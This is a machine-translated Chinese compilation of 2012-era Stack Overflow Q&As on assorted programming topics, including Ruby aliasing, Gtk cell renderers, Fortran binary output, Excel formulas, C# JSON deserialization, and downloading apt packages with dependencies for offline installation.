我可以想象做你想做的唯一方法是通过破解 UIWebView 来加载 facebook 登录页面而不向用户显示它并在可能的情况下注入凭据！？我想这会很棘手，需要付出很大的努力才能做到。而是坚持通常的做法。

查看[Facebook SDK 文档或](https://developers.facebook.com/mobile/)[BMSocialShare](https://github.com/blockhaus/BMSocialShare)等开源项目。

# ruby - Ruby 覆盖类方法

> ID：13756773
> 
> 赞同：1
> 
> 时间：2012-12-07T04:08:11.207
> 
> 标签：ruby, class

例如，是否可以覆盖“puts”方法并将其替换为调用两次“puts”的函数？

例如：

```
class IO
  def puts str
    puts str
    puts str
  end
end 
```

我知道这个例子很愚蠢，但我需要它来做其他事情。基本上，我想覆盖一个函数，但我希望覆盖函数包括对原始覆盖函数的调用。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-07T04:11:14.533

```
class IO

  alias puts_orig puts
  def puts str
    puts_orig str
    puts_orig str
  end
end 
```

# complexity-theory - 特定伪代码算法的复杂性

> ID：13756778
> 
> 赞同：-1
> 
> 时间：2012-12-07T04:08:48.813
> 
> 标签：complexity-theory, big-o, time-complexity, pseudocode

我只是在为我的数据结构和算法期末学习。以下问题是我的期中考试，我弄错了，所以我只是想弄清楚：

> **以下伪代码的复杂度是多少？**
> 
> ```
>  x <- 0
>  for x <- 0 to n:
>    for y <- 0 to n:
>      y <- y + 1
>      y <- y * 2 
> ```

在期中我回答了 O( n^2 ) 但现在我再次查看它，我认为它可能是 O( nlogn ) .. 请参阅下面的答案显示我的尝试。

正确答案是什么？

任何帮助都可以帮助我通过考试！

干杯!

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-07T04:16:07.563

以下是我暂时的回答...

外循环`for x <- 0 to n`肯定会执行 n 次。

内部循环`for y <- 0 to n`似乎执行了 n 次，但每次执行时，其包含的代码都会使 y 以指数方式接近 n。所以我相信这部分代码的执行复杂度为 O(logn)。

因此，整个算法的执行时间复杂度为 O(nlogn)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-04-11T01:53:57.393

根据经验，我可能敢于这样表示您的算法的行为：

![在此处输入图像描述](../Images/6a7be090db64c97f8cea2a0bbee683c9.png)

一些快照（“sum”是迭代次数）：

![在此处输入图像描述](../Images/6d8cf474d75d223eaaa0eebde3e09b4c.png)

![在此处输入图像描述](../Images/8beb1a2852e17b9e6020575f2543dd69.png)

![在此处输入图像描述](../Images/d6d411934be3a5942b93589dd18774a7.png)

![在此处输入图像描述](../Images/6a090f00ee4642400fe429061d2e7173.png)

```
500 * 8 = 4000 
```

![在此处输入图像描述](../Images/996e58ce3caefe6909e035b9fcc18f20.png)

[对数计算器链接](http://www.1728.org/logrithm.htm)

# java - 我想看一个从 aspx webservice 传递对象数组的示例 web 方法

> ID：13756783
> 
> 赞同：1
> 
> 时间：2012-12-07T04:09:08.600
> 
> 标签：java, android, asp.net, json, web-services

我试图自学如何使用来自 android 的 aspx web 服务。

在这种情况下，我试图从 Web 服务传递一组对象。

我想看一下传递对象数组的示例 [web 方法]。

如果可能的话，还有一个示例代码，说明 android 应用程序如何使用 Web 服务传递的数组。（java代码）

任何发布的代码将不胜感激..提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T04:33:21.420

您将不得不使用 JSON 来获取 Android 中的对象数组

所以现在，让我开始逐步演示解析相同的 JSON 响应：

第1步：

使用接收到的响应字符串创建一个 JSONObject：

`JSONObject jsonObject = new JSONObject(strJSONResponse);`

第2步：

使用 getJSONObject() 方法从创建的 json 对象中获取主对象：

`JSONObject object = jsonObject.getJSONObject("FirstObject");`

步骤 - 3：

现在这个 FirstObject 包含 2 个字符串，即“attr1”、“attr2”和一个对象，即“sub”。因此，使用 getString() 方法获取 2 个字符串。

`String attr1 = object.getString("attr1"); String attr2 = object.getString("attr2");`

并使用与我们上面使用的相同的 getJSONObject() 方法获取子对象：

`JSONObject subObject = object.getJSONObject("sub");`

第4步：

现在这个“sub”子对象包含1个数组，即“sub1”。所以我们可以使用 getJSONArray() 方法获取这个 JSON 数组：

`JSONArray subArray = subObject.getJSONArray("sub1");`

现在，我们只需要像处理简单字符串数组一样处理这个数组：

`for(int i=0; i&lt;subArray.length(); i++) { strParsedValue+="\n"+subArray.getJSONObject(i).getString("sub1_attr").toString(); }`

# python - Gtk.TreeView 中的 Gtk.Entry (CellRenderer)

> ID：13756787
> 
> 赞同：2
> 
> 时间：2012-12-07T04:09:21.560
> 
> 标签：python, gtk, pygobject, gobject, gobject-introspection

我想将 a `Gtk.Entry`（已`Gtk.EntryCompletion`连接）打包到`Gtk.TreeView`. 有谁知道如何做到这一点？（我只需要在表格视图中的文本条目上完成条目。）

我是否可能需要继承`Gtk.CellRenderer`or`Gtk.CellRendererText`并覆盖该`start_editing`方法（或类似方法）？我可以找到 subclassing 的示例`Gtk.CellRenderer`，但不能修改可编​​辑的行为。我也找不到该`Gtk.CellRendererText`课程的源代码。

我正在使用 Gobject Introspection（即`from gi.repository import Gio, Gtk, GLib, Gdk`）。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-07T19:22:15.263

好的，我终于想出了如何做到这一点。

```
class CellRendererAutoComplete(Gtk.CellRendererText):

    """ Text entry cell which accepts a Gtk.EntryCompletion object """

    __gtype_name__ = 'CellRendererAutoComplete'

    def __init__(self, completion):
        self.completion = completion
        Gtk.CellRendererText.__init__(self)

    def do_start_editing(
               self, event, treeview, path, background_area, cell_area, flags):
        if not self.get_property('editable'):
            return
        entry = Gtk.Entry()
        entry.set_completion(self.completion)
        entry.connect('editing-done', self.editing_done, path)
        entry.show()
        entry.grab_focus()
        return entry

    def editing_done(self, entry, path):
        self.emit('edited', path, entry.get_text()) 
```

灵感来自[PyGTK 常见问题解答](http://faq.pygtk.org/index.py?req=show&file=faq13.055.htp)，并适用于`pygobject`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-07T09:58:58.220

您不必子类化，GTK+ 很少需要这个。当然，它在 Python 中（比在 C 中）可能更实用，如果是这样的话应该没问题。

[此页面](http://en.wikibooks.org/wiki/GTK+_By_Example/Tree_View/Editable_Cells#Editable_Text_Cells)显示如何通过将`[editable](http://developer.gnome.org/gtk3/stable/GtkCellRendererText.html#GtkCellRendererText--editable)`属性设置为 来启用编辑`TRUE`。

您可以使用`[gtk_tree_view_set_cursor()](http://developer.gnome.org/gtk3/stable/GtkTreeView.html#gtk-tree-view-set-cursor)`将光标移动到单元格并以编程方式开始编辑。

# android - Google Goggles - Android 应用程序

> ID：13756789
> 
> 赞同：2
> 
> 时间：2012-12-07T04:09:40.580
> 
> 标签：android, google-app-engine

Google goggles 是最新的安卓应用程序，旨在通过 PHOTO 搜索互联网上的内容。现在可以将照片上传到应用程序，然后它会在互联网上找到相关的个人资料和其他链接。我想知道他们背后使用的是哪种机制？

首先，我考虑颜色强度，但它可能不起作用..然后我考虑颜色强度到 x 轴和 y 轴的形状分布，但我认为它不正确。

现在谁能告诉我他们在后端使用的是哪种技术？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T04:57:57.170

> 现在谁能告诉我他们在后端使用的是哪种技术？

有一些可能性。他们可能会像 rofls 所说的那样使用神经网络，但我认为他们正在使用[数据挖掘](http://en.wikipedia.org/wiki/Data_mining)和[遗传算法](http://en.wikipedia.org/wiki/Genetic_algorithm)，我认为这种方法对于搜索和聚类非常大的数据更有效。[Here对使用遗传算法](http://www.uic.edu/classes/idsc/ids572cna/GADataMining_CNA.pdf)进行数据挖掘的一个很好的解释和另一篇关于它的论文[Incremental Clustering in Data Mining](http://www.ijcte.org/papers/161-G262.pdf)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-07T04:22:33.947

是的，他们正在使用[机器学习](http://en.wikipedia.org/wiki/Machine_learning)。很可能是像[神经网络](http://en.wikipedia.org/wiki/Artificial_neural_network)这样的东西，其中基本上有一个“黑匣子”来预测正确的事情。看到这个：[从哪里开始使用神经网络进行手写识别？](https://stackoverflow.com/questions/1968501/where-to-start-handwritten-recognition-using-neural-network)，例如。他们在巨大的服务器上训练神经网络，这就是为什么他们可以处理复杂的图像等......不像我们的计算机能够做到的。

# arrays - 从 fortran 写出 256^3 数组的最佳方法，以便 matlab 可以读取它

> ID：13756792
> 
> 赞同：1
> 
> 时间：2012-12-07T04:09:44.633
> 
> 标签：arrays, matlab, fortran, gfortran

我有一个我创建的数组，大小为：256^3。

```
real*8, dimension(256,256,256) :: dense

open(unit=8,file=fname,form="unformatted")
write(8)dense(:,:,:)
close(8) 
```

写出来以便 Matlab 可以读取它的最佳方法是什么？我有一些我想使用的后期处理。

我正在使用 gfortran，所以我不能使用二进制格式：{ 这是真的吗？我将表单设置为“二进制”，但它无法识别它。我也没有安装ifort。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-07T04:49:45.720

使用未格式化的流访问将数组写出。流访问是二进制的标准等价物。从 IRO-bot 的答案中窃取：

```
real(kind=kind(0.0d0)),dimension(256,256,256) :: dense

open(unit=8,file='test.dat',& ! Unformatted file, stream access
  form='unformatted',access='stream')
write(unit=8) dense           ! Write array
close(unit=8)
end 
```

这很可能足以满足您的需求。但请注意，对于更复杂或更复杂的输出要求，Matlab 带有一个可从编译语言调用的例程库，允许您编写 .mat 文件。还存在其他可以促进这种数据传输的库 - 例如 HDF5。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-07T06:17:09.113

`stream`是的，您可以按照 IanH 的建议使用两种访问方式编写二进制文件，或者`direct`访问：

```
integer :: reclen
real(kind=kind(0.0d0)),dimension(256,256,256) :: dense

inquire(iolength=reclen)dense ! Inquire record length of the array dense
open(unit=8,file='test.dat',& ! Binary file, direct access
     form='unformatted',access='direct',recl=reclen)
write(unit=8,rec=1)dense      ! Write array into first record 
close(unit=8)

end 
```

Unless you specify `access` attribute in the `open` statement, the file will be opened in `sequential` mode, which may be inconvenient for reading because it adds a padding to each record which contains information about record length. By using `direct` access, you are able to specify the record length explicitly, and in this case, the size of the file written will be exactly `8*256^3`, so assuming you know the array ordering and endianness, you are able to read it from your MATLAB script.

# android - 当子活动从android中的最近列表开始时如何重新启动应用程序

> ID：13756793
> 
> 赞同：2
> 
> 时间：2012-12-07T04:09:57.880
> 
> 标签：android, android-activity, restart, launchmode

我的应用程序有两个活动。

*   主要活动：单任务
*   子活动：singleInstance

使用触摸应用程序图标启动应用程序时，主要活动开始。并转到子活动，然后按主页按钮。然后使用任务杀手杀死应用程序。当用户从最近的列表中选择应用程序时，我想重新启动应用程序，但应用程序从子活动开始。我试图在主要活动上设置 clearTaskOnLaunch 但它不起作用。

有谁知道如何解决这个问题？

# python - 根据标点符号大小写文本

> ID：13756794
> 
> 赞同：1
> 
> 时间：2012-12-07T04:10:02.033
> 
> 标签：python, text, formatting, state-machine

根据标点符号和修复格式（空格等），将文本更改为正确大小写的最有效方法是什么？

```
the qUiCk BROWN fox:: jumped. over , the lazy    dog. 
```

期望的结果：

```
The quick brown fox: jumped. Over, the lazy dog. 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T05:12:28.553

您将问题标记为“正则表达式”，但我不建议使用正则表达式来尝试解决此问题。这最好用一个简单的状态机来处理。

这是一个足以处理您的示例的简单状态机。如果您在其他文本上尝试它，您可能会发现它无法处理的情况；我希望你会发现它的设计很清晰，并且你可以毫不费力地修改它以适应你的目的。

```
import string

s = "the qUiCk BROWN fox:: jumped. over , the lazy    dog."
s_correct = "The quick brown fox: jumped. Over, the lazy dog."

def chars_from_lines(lines):
    for line in lines:
        for ch in line:
            yield ch

start, in_sentence, saw_space = range(3)

punct = set(string.punctuation)
punct_non_repeat = punct - set(['.', '-'])
end_sentence_chars = set(['.', '!', '?'])

def edit_sentences(seq):
    state = start
    ch_punct_last = None

    for ch in seq:
        ch = ch.lower()

        if ch == ch_punct_last:
            # Don't pass repeated punctuation.
            continue
        elif ch in punct_non_repeat:
            ch_punct_last = ch
        else:
            # Not punctuation to worry about, so forget the last.
            ch_punct_last = None

        if state == start and ch.isspace():
            continue
        elif state == start:
            state = in_sentence
            yield ch.upper()

        elif state == in_sentence and ch in end_sentence_chars:
            state = start
            yield ch
            yield ' '
        elif state == in_sentence and not ch.isspace():
            yield ch
        elif state == in_sentence and ch.isspace():
            state = saw_space
            continue

        elif state == saw_space and ch.isspace():
            # stay in state saw_space
            continue
        elif state == saw_space and ch in punct:
            # stay in state saw_space
            yield ch
        elif state == saw_space and ch.isalnum():
            state = in_sentence
            yield ' '
            yield ch

#with open("input.txt") as f:
#    s_result = ''.join(ch for ch in edit_sentences(chars_from_lines(f)))

s_result = ''.join(ch for ch in edit_sentences(s))

print(s_result)
print(s_correct) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-07T05:06:57.207

假设`line`是输入字符串。以下应该做一些非常接近你想要的事情。请注意，换行符（和其他空格）将变成单个空格。

```
import string    # used to check if a character is a letter
#assume we start with a letter and not, for instance, a quotation mark
assert line[0] in string.letters
line = line.capitalize()
duplPunct = [] #list of indices of duplicate punctuation
prev = line[0]
for i in range(len(line))[1:]:
    if line[i] == prev and prev not in string.letters:
        duplPunct.append(i)
    prev = line[i]
while len(duplPunct):
    i = duplPunct.pop()    #returns last index needing deletion
    line = line[:i]+line[i+1:]
words = line.split() #removes all whitespace
floatingchar = []  #list of indices of words containing only a single invalid character
for i in range(len(words))[1:]:
    word = words[i]
    if len(word) == 1 and word not in 'ai':
        #assume single-character 'words' should be part of previous word
        floatingchar.append(i)
while len(floatingchar):
    i = floatingchar.pop()
    words[i-1] = words[i-1]+words[i]
    del words[i]
needCaps = [] #list of indices of words requiring capitalization
for i in range(len(words))[:-1]:
    if words[i][-1] in '.!?':
        needCaps.append(i+1)
while len(needCaps):
    i = needCaps.pop()
    words[i] = words[i].capitalize()
line = ' '.join(words) 
```

# excel - 使用内置公式的excel数据转置

> ID：13756795
> 
> 赞同：0
> 
> 时间：2012-12-07T04:10:07.000
> 
> 标签：excel, excel-2007, excel-formula, excel-2010

这是我在工作中从数据库中转储的问题，其格式相当复杂。基本上，它不会像单独的关系表那样为您提供显示的信息。

示例：假设我有以下信息列

ID、颜色、尺寸、数量、类型

信息看起来像这样

```
ID 颜色 尺寸 数量 类型
棕色 20 1 1
C 黄色 10 2 2
D 棕色 40 5 1
蓝色 70 1 3
A 黄色 80 1 2
B 黄色 20 4 1
D 蓝色 70 4 2
C 蓝色 10 3 1

```

我需要的是更像这样的东西

```
ID 棕色尺码类型 蓝色尺码类型 黄色尺码类型
A 1 20 1 1 0 3 1 80 2
B 0 0 0 0 0 0 4 20 1
C 0 0 0 3 10 1 2 20 1
D 5 40 1 4 0 2 0 0 0

```

我最喜欢可以用一个excel公式来完成这个，可能是一个叫做sumifs的公式，但我似乎无法让它工作，对此有任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-08T20:40:10.050

您可以通过在数组公式中使用 SUM 和 IF 的组合来做到这一点。

假设您的数据表从单元格 A1 开始，您的结果表从单元格 A11 开始，首先在单元格 B12、C12 和 D12 中分别输入以下公式，确保使用 CONTROL-SHIFT-ENTER 组合键输入它们。

```
B12    =SUM(IF($B$2:$B$9=B$11,IF($A$2:$A$9=$A12,$D$2:$D$9,0)))

C12    =SUM(IF($B$2:$B$9=B$11,IF($A$2:$A$9=$A12,$C$2:$C$9,0)))

D12    =SUM(IF($B$2:$B$9=B$11,IF($A$2:$A$9=$A12,$E$2:$E$9,0))) 
```

将单元格复制到数据表的底部，在本例中为第 15 行。

然后将您创建的公式块复制到单元格 E12，结果表的蓝色部分从此处开始。然后将相同的公式块复制到单元格 H12，结果表的黄色部分从此处开始。

此解决方案假定您的数据表中没有重复的 ID 和 COLOR 组合，并且没有丢失任何组合。如果缺少 ID 和颜色的组合，则需要将公式包装在 IFERROR 函数中（在 Excel 2010 中）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-02-07T13:53:50.513

我转置数据表的方式会像这样运行......

你的例子有点复杂，所以我不打算使用你的全部数据，只用大小。首先创建一个名为 Index 的列

```
A                B   C       D
INDEX            ID  COLOR   SIZE  
=A3 & "-" & B3   A   brown   20    
=A4 & "-" & B4   C   yellow  10    
.                D   brown   40   
.                A   blue    70   
.                A   yellow  80   
.                B   yellow  20   
D-blue           D   blue    70   
C-blue           C   blue    10 
```

创建一个等效的表，它将标题行与 ID 列组合在一起

```
F      G                    H             I
ID     brown                blue          yellow
A      =$F2 & "-" & G$1     .             .
B      .                    .             .
C      .                    C-blue        C-yellow    
D      .                    D-blue        D-yellow 
```

最后将其包装在 VLOOKUP 或 OFFSET(MATCH(_)) 中，并可能出现 IFERROR

```
ID     brown                blue          yellow
A      =IFERROR(VLOOKUP($F2 & "-" & G$1,$A$3:$D$10,4,FALSE),"Err")
B      .                    .             .
C      .                    10            10    
D      .                    70            Err 
```

无论如何，这就是我通常进行这种转换的方式

# javascript - 关于javascript document.forms[]

> ID：13756796
> 
> 赞同：1
> 
> 时间：2012-12-07T04:10:16.070
> 
> 标签：javascript

如果我的jsp中有一段javascript代码（如下所示）：

如果`var frmObj=document.forms['cseeForm'];`

而且我没有在那个jsp中创建一个名为cseeForm的表单，上面的代码是否意味着：创建一个名为cseeForm的新表单？并将其分配给frmObj？

请帮忙，我正在维护一个 Web 应用程序，但我在该 jsp 中找不到任何名为 cseeForm 的表单对象。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-07T04:17:29.383

`document.forms`只返回当前存在的表单的集合。因此，如果您尚未创建具有该名称的表单，那么

```
var frmObj = document.forms['cseeForm']; 
```

将简单地分配`undefined`给`frmObj`; 不会创建新表单。

有关更多信息，请查看[document.forms 上的相关 MDN 页面](https://developer.mozilla.org/en-US/docs/DOM/document.forms)

# c# - 如何在 Windows Phone 上读取这个 JSON？

> ID：13756797
> 
> 赞同：1
> 
> 时间：2012-12-07T04:10:20.970
> 
> 标签：c#, json, windows-phone-7, serialization

我必须阅读这个 JSON：

```
[   
    {"id":"2","code":"jne","name":"JNE"},   
    {"id":"5","code":"pcp","name":"PCP"},   
    {"id":"1","code":"pos","name":"Pos Indonesia"}, 
    {"id":"6","code":"wahana","name":"Wahana"}  
] 
```

我试过这个：

```
[DataContract]
public class Ekspedisi
{
    [DataMember]
    public int id { get; set; }
    [DataMember]
    public String code { get; set; }
    [DataMember]
    public String name { get; set; }
} 
```

和这个：

```
public static Ekspedisi[] res;  
string link5 = "http://www.ongkoskirim.com/api/0.2/?id=OAL66afd139a386fee6dc5a5597abd7daba&q=expedition"    
WebClient client = new WebClient(); 
client.OpenReadCompleted += new OpenReadCompletedEventHandler(client_OpenReadCompleted);    
client.OpenReadAsync(new Uri(link5), UriKind.Absolute); 
```

和这个 ：

```
void client_OpenReadCompleted(object sender, OpenReadCompletedEventArgs e)
{
    try
    {
        var ser = new DataContractJsonSerializer(typeof(Ekspedisi));
        res = (Ekspedisi[])ser.ReadObject(e.Result);
        for (int i = 0; i < length; i++)
        {
            Debug.WriteLine(res[i].id+","+res[i].name); 
        }
    }
    catch (Exception ex)
    {
        Debug.WriteLine(ex.Message);
        Debug.WriteLine(ex.StackTrace);
    }
} 
```

但它总是显示`invalidCastException`。谁能帮我？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T04:59:24.010

当您反序列化 JSON 时，您使用的是 Ekspedisi 类型，即使您正在返回一个集合。如果更改这行代码：

```
var ser = new DataContractJsonSerializer(typeof(Ekspedisi)); 
```

至

```
var ser = new DataContractJsonSerializer(typeof(IEnumerable<Ekspedisi>)); 
```

这是您的类型的集合；你会发现你不再收到异常。

# ipython-notebook - Ipython 在创建新笔记本时运行一些预处理器

> ID：13756798
> 
> 赞同：0
> 
> 时间：2012-12-07T04:10:28.580
> 
> 标签：ipython-notebook

有没有办法在创建新笔记本时运行脚本？我想要实现的是，每当任何用户从 Ipython 仪表板启动新笔记本时，我希望仪表板预加载新笔记本以运行一些脚本，这些脚本将填充系统中的最新信息，而无需用户键入它们。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-08T17:51:07.300

[我刚刚从http://ipython.org/ipython-doc/dev/config/ipython.html](http://ipython.org/ipython-doc/dev/config/ipython.html)找到了一个解决方法

解决方案是在 ipython_notebook_config.py 的配置参数 c.InteractiveShellApp.exec_files 中添加自定义脚本：

```
 c.InteractiveShellApp.exec_files = [
        'my_python_code.py',
        'my_ipython_code.ipy'
    ] 
```

这不是在创建笔记本时使用最新信息更新新笔记本，而是在某种程度上满足了我的要求：在没有用户明确输入“run custom_script.ipy”的情况下将自定义命令注入笔记本。

# apt-get - 如何将所有依赖项和包下载到目录

> ID：13756800
> 
> 赞同：82
> 
> 时间：2012-12-07T04:10:44.370
> 
> 标签：apt-get

我正在尝试在没有 Internet 连接的机器上安装软件包。我想要做的是将所有软件包和依赖项下载到一台具有 Internet 连接的机器上，然后将所有内容都下载到离线计算机上。

我一直在玩，`apt-get`但是`apt-cache`我还没有找到一种快速简便的方法来将包和依赖项一次性下载到我选择的目录中。我该怎么做？我是否正确地解决了这个问题？您将如何安装具有大量依赖项的离线包？

* * *

## 回答 #1

> 赞同：95
> 
> 时间：2014-12-14T12:53:52.597

标记的答案的问题是正在下载的机器上的可用包可能与目标机器不同，因此包集可能不完整。

为避免这种情况并获取所有依赖项，请使用以下命令：

```
apt-get download $(apt-rdepends <package>|grep -v "^ ") 
```

从返回的某些包`apt-rdepends`不存在`apt-get download`要下载的确切名称（例如，`libc-dev`）。在这些情况下，过滤掉那些确切的名称（确保使用`^<NAME>$`其他相关名称，例如`libc-dev-bin`，*确实*存在的名称不会被跳过）。

```
apt-get download $(apt-rdepends <package>|grep -v "^ " |grep -v "^libc-dev$") 
```

下载后，您可以将`.deb`文件移动到没有 Internet 的机器上并安装它们：

```
sudo dpkg -i *.deb 
```

* * *

## 回答 #2

> 赞同：49
> 
> 时间：2017-08-03T16:21:41.357

这里已经回答了同样的问题： [如何列出/下载 debian 包的递归依赖项？](https://stackoverflow.com/questions/22008193/how-to-list-download-the-recursive-dependencies-of-a-debian-package)

尝试：

```
PACKAGES="wget unzip"
apt-get download $(apt-cache depends --recurse --no-recommends --no-suggests \
  --no-conflicts --no-breaks --no-replaces --no-enhances \
  --no-pre-depends ${PACKAGES} | grep "^\w") 
```

* * *

## 回答 #3

> 赞同：42
> 
> 时间：2012-12-07T05:40:16.707

```
# aptitude clean
# aptitude --download-only install <your_package_here>
# cp /var/cache/apt/archives/*.deb <your_directory_here> 
```

* * *

## 回答 #4

> 赞同：21
> 
> 时间：2014-10-07T14:59:44.053

该`aptitude --download-only ...`方法仅在您拥有具有 Internet 连接的 debian 发行版时才有效。

如果你不这样做，我认为最好在断开连接的 debian 机器上运行以下脚本：

```
apt-get --print-uris --yes install <my_package_name> | grep ^\' | cut -d\' -f2 >downloads.list 
```

将 downloads.list 文件移动到连接的 linux（或非 linux）机器中，然后运行：

```
wget --input-file myurilist 
```

这会将所有文件下载到当前目录中。之后，您可以将它们复制到 USB 密钥上并安装在断开连接的 debian 机器上。

学分：[http ://www.tuxradar.com/answers/517](https://web.archive.org/web/20141006002233/http://www.tuxradar.com/answers/517)

* * *

## 回答 #5

> 赞同：9
> 
> 时间：2016-10-11T00:02:18.423

这会将所有 Debs 下载到当前目录，如果找不到候选人，也不会失败。

也不需要 sudo 来运行 sript！

```
nano getdebs.sh && chmod +x getdebs.sh && ./getdebs.sh

#!/bin/bash

package=ssmtp

apt-cache depends "$package" | grep Depends: >> deb.list

sed -i -e 's/[<>|:]//g' deb.list

sed -i -e 's/Depends//g' deb.list

sed -i -e 's/ //g' deb.list

filename="deb.list"

while read -r line
do
    name="$line"
    apt-get download "$name"
done < "$filename"

apt-get download "$package" 
```

注意：我用这个作为我的例子，因为我实际上是在尝试对 SSMTP 的 Deps 进行 DL，但它在 debconf-2.0 上失败了，但是这个脚本让我得到了我需要的东西！

* * *

## 回答 #6

> 赞同：8
> 
> 时间：2015-07-27T06:08:43.957

对我有用的某种简化（以及对我有用的方法）（基于以上所有内容）
请注意，依赖关系层次结构可以更深一层

获取包的依赖项

```
$ apt-cache depends mongodb | grep Depends:
  Depends: mongodb-dev
  Depends: mongodb-server 
```

获取网址：

```
sudo apt-get --print-uris --yes -d --reinstall install mongodb-org mongodb-org-server mongodb-org-shell mongodb-org-tools | grep "http://" |  awk '{print$1}' | xargs -I'{}' echo {} | tee files.list
wget --input-file files.list 
```

* * *

## 回答 #7

> 赞同：5
> 
> 时间：2015-06-06T16:41:30.573

我曾经`apt-cache depends package` **在任何情况下获取所有必需的软件包，无论**它们是否**已经安装在系统上**。所以它总是正确的。
由于命令 apt-cache 的工作方式不同，具体取决于语言，您必须在系统上尝试此命令并调整该命令。apt-cache 取决于 yourpackage
在英语系统上，您会得到：

```
$ apt-cache depends yourpackage
node
  Depends: libax25
  Depends: libc6 
```

在德语系统上，您会得到： node

```
 Hängt ab von: libax25
  Hängt ab von: libc6 
```

英文版本的术语：
“ `Depends:`”
您必须`yourpackage`在此命令中将术语“”更改为您的意愿两次，请注意这一点！

```
$ sudo apt-get --print-uris --yes -d --reinstall install yourpackage $(apt-cache depends yourpackage | grep "  Depends:" |  sed 's/  Depends://' | sed ':a;N;$!ba;s/\n//g') | grep ^\' | cut -d\' -f2 >downloads.list 
```

还有德语版本的术语：
“ `Hängt ab von:`”
您必须`yourpackage`在此命令中将术语“”更改为您的意愿两次，请注意这一点！
此文本在此命令中使用了两次，如果您想使其适应您的语言，请注意这一点！

```
$ sudo apt-get --print-uris --yes -d --reinstall install yourpackage $(apt-cache depends yourpackage | grep "Hängt ab von:" |  sed 's/  Hängt ab von://' | sed ':a;N;$!ba;s/\n//g') | grep ^\' | cut -d\' -f2 >downloads.list 
```

您在 downloads.list 中获得链接列表
检查列表，转到您的文件夹并运行列表：

```
$ cd yourpathToYourFolder

$ wget --input-file downloads.list 
```

您需要的所有软件包都在：

```
$ ls yourpathToYourFolder 
```

* * *

## 回答 #8

> 赞同：4
> 
> 时间：2019-02-13T16:03:10.933

这会将所有包和依赖项（尚未安装）下载到您选择的目录：

```
sudo apt-get install -d -o Dir::Cache=/path-to/directory/apt/cache -o Dir::State::Lists=/path-to/directory/apt/lists packages 
```

确保`/path-to/directory/apt/cache`并`/path-to/directory/apt/lists`存在。如果你不设置`-o Dir::Cache`它指向`/var/cache/apt`， `Dir::State::Lists`指向`/var/lib/apt/lists`（*它保留了可用包的索引文件*）

这两个`-o`选项都可以与更新和升级一起使用，而不是安装。

在不同的机器上运行相同的命令，没有' `-d`'

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2012-12-07T04:23:55.070

我假设你有一个不错的胖 USB HD 和良好的网络连接。您可以使用 apt-mirror 来创建自己的 debian 镜像。

[http://apt-mirror.sourceforge.net/](http://apt-mirror.sourceforge.net/)

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2021-08-30T19:16:35.187

如果您接受警告说您的系统上可能已经安装了依赖项，那么最简单的方法是去 apt-get install --simulate <your_package>，这将首先列出它将安装的所有依赖项，然后复制列表包，然后 apt-get 下载 <the_list_of_packages>

* * *

例如，对于 xubuntu-21.04 MINIMAL INSTALL 上的 qt5-gtk2-platformtheme，您将获得（在 apt-get install --simulate 之后）以下内容：

libdouble-conversion3 libmd4c0 libpcre2-16-0 libqt5core5a libqt5dbus5 libqt5gui5 libqt5network5 libqt5svg5 libqt5widgets5 libxcb-icccm4 libxcb-image0 libxcb-keysyms1 libxcb-render-util0 libxcb-xinerama0 libxcb-xinput0 libxcb-xkb1 libxkbcommon-x11-0 qt5-gtk-platformtheme qttranslations5- l10n

然后你只需 cd 在你选择的文件夹中，执行 apt-get download <the_list_above>，你就可以将它们全部 d/w 放在那里。然后你可以 dpkg -i *.deb

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2022-02-20T02:20:43.120

通过@onno 给出的命令补充并自动排除所有冲突依赖项（未找到依赖项）：

`apt-get download $(apt-rdepends <package>|grep -v "^ " |grep -v "^conflictiv-dependency$")`

至少对于 Ubuntu，错误消息格式如下：

`E: Can't select candidate version from package <package> as it has no candidate`

以下脚本下载所有找到的依赖项，不包括未找到的依赖项：

```
#!/bin/bash
rm -f error.txt
apt download $(apt-rdepends $1 | grep -v "^ ") 2> error.txt
#IF THERE WAS ERRORS (DEPENDENCIES NOT FOUND)
if [ $(cat error.txt | wc -l) -gt 0 ]
then
    partial_command="\("
    while read -r line
    do
        conflictive_package="$(awk '{split($0,array," "); print array[8]}' <<< $line)"
        partial_command="$partial_command$conflictive_package\|"
    done < error.txt

    partial_command="$(awk '{print substr($0, 1, length($0)-2)}' <<< $partial_command)\)"
    eval "apt download \$(apt-rdepends $1 | grep -v '^ ' | grep -v '^$partial_command$')"
fi
rm error.txt 
```

# sql - 不使用电子邮件的情况

> ID：13756803
> 
> 赞同：1
> 
> 时间：2012-12-07T04:11:10.407
> 
> 标签：sql, sql-server, tsql, case-when

下面的 sql 查询适用于 CASE WHEN 中的所有检查，接受某些电子邮件。当我每次运行查询检查电子邮件时，它有时会起作用，有时却不起作用。我已经完成了 RTRIM(LTRIM(m.Email)) 但这也不起作用。比较电子邮件时，我需要做些不同的事情吗？

```
exec BuildingPros.uspGetEmployees 1697,'Email','someone@somewhere.net'

alter proc BuildingPros.uspGetEmployees
@ProID INT,
@Where  VARCHAR(12) = NULL,
@Equals VARCHAR(25) = NULL
AS
      SELECT m.UserId,u.UserName,e.NonProID'ID',m.Email,c.FirstName'FName',c.LastName'LName',
                      ISNULL(c.Title,'NA')'Title',z.ZIPCode'Zip', p.Phone
        FROM     Person.UtbAddressesutbContact ac JOIN
                          Person.utbAddresses a ON ac.AddressID = a.AddressID JOIN 
